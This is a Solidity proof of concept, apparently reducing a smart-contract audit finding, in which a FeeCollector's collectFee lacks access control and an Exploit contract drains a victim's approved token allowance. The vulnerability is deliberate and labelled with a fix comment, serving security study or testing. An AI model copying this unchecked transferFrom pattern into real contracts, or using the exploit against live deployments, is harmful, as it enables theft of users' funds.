// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Regnum Aurum — FeeCollector.collectFee has no access control (Pashov H-27)
    SYNTHETIC, cheatcode-free reduction. borrowWithInsurance tells the user to
    approve the insurance fee to FeeCollector. collectFee then transferFroms any
    target. The pull is verbatim. */

contract MockUSDC {
    string public constant symbol = "USDC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Victim {
    function approveInsurance(MockUSDC token, address collector, uint256 amount) external {
        token.approve(collector, amount);
    }
}

contract FeeCollector {
    uint256 public constant MAX_FEE_AMOUNT = 1_000_000 ether;
    mapping(bytes32 => bytes32) public feeTypes;
    mapping(address => bool) public isTokenSupported;
    mapping(address => uint256) public collected;

    error InvalidFeeAmount();
    error FeeTypeDoesNotExist();
    error TokenNotSupported();

    function support(address token, bytes32 feeType) external {
        feeTypes[feeType] = feeType;
        isTokenSupported[token] = true;
    }

    function collectFee(address token, address target, uint256 amount, bytes32 feeType) external returns (bool) {
        if (amount == 0 || amount > MAX_FEE_AMOUNT) revert InvalidFeeAmount();
        if (feeTypes[feeType] == bytes32(0)) revert FeeTypeDoesNotExist();
        if (!isTokenSupported[token]) revert TokenNotSupported();
        MockUSDC(token).transferFrom(target, address(this), amount); // @> VULN: no caller check. Anyone can pull target's allowance. FIX: only the lending pool may collect, inside the borrow.
        collected[token] += amount;
        return true;
    }
}

contract Exploit {
    MockUSDC public token; // nonce 1
    FeeCollector public collector; // nonce 2
    Victim public victim; // nonce 3

    constructor() {
        token = new MockUSDC();
        collector = new FeeCollector();
        victim = new Victim();
    }

    function run() external {
        bytes32 insurance = keccak256("INSURANCE_FEE");
        collector.support(address(token), insurance);
        token.mint(address(victim), 1000 ether);
        victim.approveInsurance(token, address(collector), 1000 ether);
        // Victim has not borrowed. The allowance alone is enough.
        bool ok = collector.collectFee(address(token), address(victim), 1000 ether, insurance);
        require(ok, "collect");
        require(token.balanceOf(address(victim)) == 0, "victim drained");
        require(token.balanceOf(address(collector)) == 1000 ether, "fee taken");
        require(token.allowance(address(victim), address(collector)) == 0, "allowance spent");
    }
}
